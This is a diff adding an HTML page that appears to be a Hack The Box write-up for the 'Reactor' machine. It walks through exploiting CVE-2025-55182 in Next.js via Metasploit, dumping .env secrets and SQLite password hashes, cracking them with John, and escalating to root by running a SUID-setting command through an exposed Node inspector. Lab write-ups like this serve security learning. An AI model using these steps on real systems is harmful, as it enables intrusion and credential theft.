@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Reactor — .d4nx0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-terminal"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>Reactor</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span> Week <span class="highlight">#1</span></div>
+            <div class="row"> Machine <span class="highlight">Reactor</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Easy</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">React2Shell</span>] [<span class="highlight">CVE-2025-55182</span>] [<span class="highlight">Node Inspect</span>] [<span class="highlight">SUID</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>nmap -sS -sCV -T4 -oN nmap-result.txt -oX nmap-result.xml <span class="ph">&lt;target-ip&gt;</span></code></pre>
+
+          <p><strong>Open Ports:</strong></p>
+          <ul>
+            <li><strong>22/tcp</strong> – SSH (OpenSSH 9.6p1 Ubuntu)</li>
+            <li><strong>3000/tcp</strong> – HTTP (Next.js / React app)</li>
+          </ul>
+
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            Port 3000 serves a Next.js application. Wappalyzer reports <strong>Next.js 15.0.3</strong>, which is in scope for <strong>React2Shell (CVE-2025-55182)</strong>
+          </div>
+
+          <div class="note-image">
+            <img src="../src/images/reactor/reactor-1.png" alt="Wappalyzer showing Next.js 15.0.3" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: Wappalyzer / Next.js 15.0.3]</em>'">
+          </div>
+
+          <h2>2. Exploitation</h2>
+          <h3>React2Shell via Metasploit</h3>
+          <p>Use the public Metasploit module for CVE-2025-55182 against the Next.js service on port 3000.</p>
+          <pre><code>sudo msfdb init && msfconsole
+search cve 2025 55182
+
+use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
+set rhost <span class="ph">&lt;target-ip&gt;</span>
+set lhost tun0
+set rport 3000
+run</code></pre>
+
+          <div class="callout warning">
+            <strong>⚠️ Foothold</strong>
+            After RCE, inspect the application root for a <code>.env</code> file and an SQLite database holding user password hashes.
+          </div>
+
+          <h3>Extract Credentials from SQLite</h3>
+          <pre><code>cat .env
+
+sqlite3 /opt/reactor-app/reactor.db ".tables"
+sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/reactor/reactor-2.png" alt="SQLite users table with engineer hash" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: SQLite users / engineer hash]</em>'">
+          </div>
+
+          <p>Crack the <code>engineer</code> MD5 hash with John, then SSH in:</p>
+          <pre><code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+ssh engineer@<span class="ph">&lt;target-ip&gt;</span>
+cat user.txt</code></pre>
+
+          <h2>3. Privilege Escalation</h2>
+          <h3>Node Inspect as Root</h3>
+          <p>A process is running with root privileges and exposing the Node.js inspector:</p>
+          <pre><code>ps aux | grep inspect</code></pre>
+
+          <div class="note-image">
+            <img src="../src/images/reactor/reactor-3.png" alt="Root process with node --inspect" onclick="toggleZoom(this)" onerror="this.parentElement.innerHTML='<em style=color:var(--text-muted)>[image: ps aux | grep inspect]</em>'">
+          </div>
+
+          <p>Forward the inspector port over SSH:</p>
+          <pre><code>ssh -L 9229:127.0.0.1:9229 engineer@<span class="ph">&lt;target-ip&gt;</span></code></pre>
+
+          <p>In Chrome, open <code>chrome://inspect</code>, attach to the target, and run:</p>
+          <pre><code>require('child_process').execSync('chmod u+s /bin/bash')</code></pre>
+
+          <div class="callout warning">
+            <strong>⚠️ Abuse</strong>
+            The inspector runs as root, so this plants a SUID bit on <code>/bin/bash</code>.
+          </div>
+
+          <h3>Root Shell</h3>
+          <pre><code>/bin/bash -p
+whoami
+cat /root/root.txt</code></pre>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>/home/engineer/user.txt</code></li>
+            <li><strong>Root flag:</strong> <code>/root/root.txt</code></li>
+          </ul>
+
+          <div class="callout info">
+            <strong>✅ Lessons Learned</strong>
+            Unauthenticated RCE in a modern Next.js stack (React2Shell) dropped a shell into the app environment where secrets and SQLite hashes lived. Always check local services after foothold — a root-owned Node inspector on <code>127.0.0.1:9229</code> turned into trivial SUID escalation via Chrome DevTools. Keep dependency versions patched and never expose debug/inspect ports.
+          </div>
+        </div>
+
+      </div>
+      <footer class="page-footer">// NOTES ARE STATIC, VERSIONED IN GIT — EDIT HTML AND PUSH</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','unzip','python3','sudo','nmap','ssh','ssh-keygen','sshpass','rustscan','gobuster','ffuf','curl','nc','echo','cat','cd','mkdir','msfconsole','msfdb','search','use','set','run','john','sqlite3','ps','grep','chmod','whoami','bash'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
